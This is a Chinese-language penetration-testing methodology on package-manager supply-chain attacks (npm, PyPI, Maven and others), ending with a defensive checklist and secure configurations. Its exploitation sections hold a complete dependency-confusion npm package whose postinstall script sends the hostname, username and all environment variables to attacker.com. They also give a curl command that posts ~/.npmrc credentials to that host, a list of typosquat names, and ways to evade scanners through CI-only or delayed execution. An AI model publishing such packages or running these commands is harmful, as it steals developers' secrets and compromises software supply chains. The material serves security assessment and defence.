# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的包管理器安全测试流程。通过本方法论，测试人员能够系统性地检测和利用包管理器（npm、PyPI、Maven、NuGet、Gem、Composer 等）相关的安全漏洞，包括依赖投毒、配置错误、凭证泄露等问题。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 npm 的 Node.js 项目
- 使用 pip 的 Python 项目
- 使用 Maven/Gradle 的 Java 项目
- 使用 NuGet 的 .NET 项目
- 使用 Gem 的 Ruby 项目
- 使用 Composer 的 PHP 项目
- CI/CD 中的包管理流程
- 私有包仓库配置

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行供应链安全评估的顾问
- 负责依赖管理的技术人员
- DevSecOps 工程师

---

# 第二部分：核心渗透技术专题

## 专题一：包管理器安全测试

### 2.1 技术介绍

包管理器安全测试关注应用依赖管理过程中的安全风险，包括依赖投毒、配置错误、凭证泄露、更新机制漏洞等。

**主要风险：**
- **依赖投毒：** 恶意包被发布到公共仓库
- **Typosquatting：** 包名混淆攻击
- **依赖混淆：** 利用公共/私有仓库优先级
- **配置错误：** 包管理器配置不当导致凭证泄露
- **更新劫持：** 更新机制被利用
- **供应链攻击：** 通过依赖链传递恶意代码

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **Node.js 项目** | npm/yarn 安装依赖 | 公共 npm 仓库与私有仓库冲突 |
| **Python 项目** | pip 安装依赖 | PyPI 包名与内部包名冲突 |
| **Java 项目** | Maven/Gradle 依赖 | 私有 Nexus 仓库配置不当 |
| **.NET 项目** | NuGet 包管理 | 内部包名在公共 NuGet 被注册 |
| **Ruby 项目** | Gem 包管理 | RubyGems 源配置问题 |
| **PHP 项目** | Composer 依赖 | Packagist 源信任问题 |
| **CI/CD 构建** | 自动安装依赖 | 无锁文件或锁文件被绕过 |
| **容器构建** | Docker 镜像构建 | 构建缓存污染 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**包管理器识别：**

1. **识别项目类型和包管理器**
   ```bash
   # 检查项目配置文件
   ls -la package.json          # npm
   ls -la requirements.txt      # pip
   ls -la pom.xml               # Maven
   ls -la packages.config       # NuGet
   ls -la Gemfile               # Bundler
   ls -la composer.json         # Composer
   
   # 检查锁文件
   ls -la package-lock.json yarn.lock
   ls -la Pipfile.lock
   ls -la Gemfile.lock
   ls -la composer.lock
   ```

2. **识别依赖源配置**
   ```bash
   # npm 配置
   curl https://target.com/.npmrc
   
   # pip 配置
   curl https://target.com/pip.conf
   
   # Maven 配置
   curl https://target.com/.m2/settings.xml
   ```

3. **分析依赖结构**
   ```bash
   # npm
   npm list --depth=0
   
   # pip
   pip freeze
   
   # Maven
   mvn dependency:tree
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **检查依赖配置文件**
   ```json
   // package.json 危险配置
   {
     "dependencies": {
       "some-package": "*",        // 危险：使用最新版本
       "another-package": "latest" // 危险：使用 latest
     }
   }
   
   // 安全配置
   {
     "dependencies": {
       "some-package": "1.2.3"     // 固定版本
     }
   }
   ```

2. **检查私有源配置**
   ```ini
   # .npmrc 危险配置
   registry=https://public-npm.npmjs.org/
   # 没有配置私有源优先级
   
   # 安全配置
   @internal:registry=https://private-registry.company.com/
   //private-registry.company.com/:_authToken=${NPM_TOKEN}
   ```

3. **检查 CI/CD 配置**
   ```yaml
   # .github/workflows/ci.yml
   # 检查依赖安装命令
   - run: npm install  # 危险：无锁文件
   - run: npm ci       # 安全：使用锁文件
   ```

### 2.4 漏洞利用方法

#### 2.4.1 依赖混淆攻击

**步骤 1：识别内部包名**
```bash
# 从公开仓库获取包名列表
# - 源码泄露
# - 错误配置的 registry
# - 社会工程学

# 检查包名是否可注册
npm view internal-package-name 2>/dev/null || echo "可注册"
pip show internal-package-name 2>/dev/null || echo "可注册"
```

**步骤 2：发布恶意包**
```bash
# 创建恶意 npm 包
mkdir malicious-pkg
cd malicious-pkg
npm init -y

# 修改 package.json
cat > package.json << EOF
{
  "name": "target-internal-package",
  "version": "99.99.99",
  "scripts": {
    "postinstall": "node exploit.js"
  }
}
EOF

# 创建恶意脚本
cat > exploit.js << EOF
const { execSync } = require('child_process');
const os = require('os');
const http = require('http');

// 收集信息
const info = {
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env
};

// 外带
http.get(\`http://attacker.com/exfil?data=\${encodeURIComponent(JSON.stringify(info))}\`);
EOF

# 发布
npm publish
```

#### 2.4.2 Typosquatting 攻击

**常见拼写错误包名：**

| 目标包 | 恶意包名变体 |
|-------|------------|
| `requests` | `reqeusts`, `requets`, `requestss` |
| `lodash` | `lodahs`, `loda-sh`, `1odash` |
| `express` | `expres`, `expresss`, `exress` |
| `react` | `reacct`, `reaact`, `reactjs` |
| `axios` | `axois`, `aixos`, `axiox` |
| `django` | `dajngo`, `djnago`, `djang0` |
| `flask` | `flaask`, `flaskk`, `f1ask` |

**发布 Typosquatting 包：**
```bash
npm init -y
# 修改 name 为 "reqeusts"
npm publish
```

#### 2.4.3 凭证窃取

**npm 凭证窃取：**
```bash
# .npmrc 可能包含凭证
cat ~/.npmrc
cat project/.npmrc

# 窃取凭证
curl -X POST -d @~/.npmrc http://attacker.com/exfil
```

**pip 凭证窃取：**
```bash
# pip.conf 可能包含凭证
cat ~/.pip/pip.conf
cat /etc/pip.conf

# 如果配置了私有源凭证
# [global]
# index-url = https://user:password@private-pypi.com/simple/
```

**Maven 凭证窃取：**
```bash
# settings.xml 可能包含凭证
cat ~/.m2/settings.xml

# 查找 server 配置中的用户名密码
grep -A 5 "<server>" ~/.m2/settings.xml
```

#### 2.4.4 构建缓存污染

**npm 缓存污染：**
```bash
# 污染全局 npm 缓存
npm config get cache
# 在缓存目录植入恶意包

# 或污染项目 node_modules
# 如果项目使用共享缓存
```

**Maven 缓存污染：**
```bash
# 污染本地 Maven 仓库
~/.m2/repository/

# 植入恶意 JAR 包
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过锁文件保护

**方法 1：针对无锁文件项目**
```bash
# 直接发布更高版本的恶意包
# 语义化版本规则会自动使用新版本
```

**方法 2：利用强制更新**
```bash
# 某些命令会绕过锁文件
npm install --force
npm update
pip install --upgrade
```

#### 2.5.2 绕过包名检测

**方法 1：使用相似字符**
```bash
# 使用 Unicode 同形字符
# аdmin (西里尔字母 а) vs admin
```

**方法 2：利用作用域包**
```json
{
  "name": "@internal/package",
  "version": "1.0.0"
}
```

#### 2.5.3 绕过安全扫描

**方法 1：条件执行**
```javascript
// 只在 CI/CD 环境中执行
if (process.env.CI === 'true') {
  // 恶意代码
}
```

**方法 2：延迟执行**
```javascript
// 延迟执行绕过初始扫描
setTimeout(() => {
  // 恶意代码
}, 60000);
```

---

# 第三部分：附录

## 3.1 常用命令速查表

| 包管理器 | 命令 | 说明 |
|---------|------|------|
| **npm** | `npm audit` | 审计依赖漏洞 |
| **npm** | `npm ls` | 列出依赖树 |
| **pip** | `pip audit` | 审计依赖漏洞 |
| **pip** | `pip freeze` | 列出已安装包 |
| **Maven** | `mvn dependency:tree` | 列出依赖树 |
| **Maven** | `mvn org.owasp:dependency-check-maven:check` | OWASP 依赖检查 |
| **NuGet** | `dotnet list package --vulnerable` | 检查漏洞包 |
| **Gem** | `bundle audit` | 审计依赖漏洞 |
| **Composer** | `composer audit` | 审计依赖漏洞 |

## 3.2 包管理器安全配置

### npm 安全配置

```ini
# .npmrc
@internal:registry=https://private-registry.company.com/
//private-registry.company.com/:_authToken=${NPM_TOKEN}
audit=true
fund=false
```

### pip 安全配置

```ini
# pip.conf
[global]
index-url = https://private-pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/
trusted-host = private-pypi.company.com
```

### Maven 安全配置

```xml
<!-- settings.xml -->
<mirrors>
  <mirror>
    <id>private</id>
    <mirrorOf>*</mirrorOf>
    <url>https://nexus.company.com/repository/maven-public/</url>
  </mirror>
</mirrors>
```

## 3.3 包管理器安全检查清单

- [ ] 使用锁文件并提交到版本控制
- [ ] 依赖版本固定
- [ ] 私有源正确配置优先级
- [ ] 凭证使用环境变量或安全存储
- [ ] 定期运行安全审计
- [ ] CI/CD 使用 `npm ci` 等安全命令
- [ ] 监控公共仓库包名注册
- [ ] 限制 postinstall 脚本执行
- [ ] 定期更新依赖
- [ ] 最小化依赖数量

## 3.4 防御建议

1. **锁文件**：始终使用并提交锁文件
2. **版本固定**：固定所有依赖版本
3. **私有源优先级**：确保内部包优先从私有源下载
4. **凭证安全**：使用安全方式存储凭证
5. **定期审计**：定期运行安全审计工具
6. **自动化更新**：使用 Dependabot 等工具自动更新
7. **最小依赖**：减少不必要的依赖
8. **CI/CD 安全**：使用安全的 CI/CD 配置
9. **监控告警**：监控依赖安全公告
10. **安全培训**：对开发团队进行安全培训
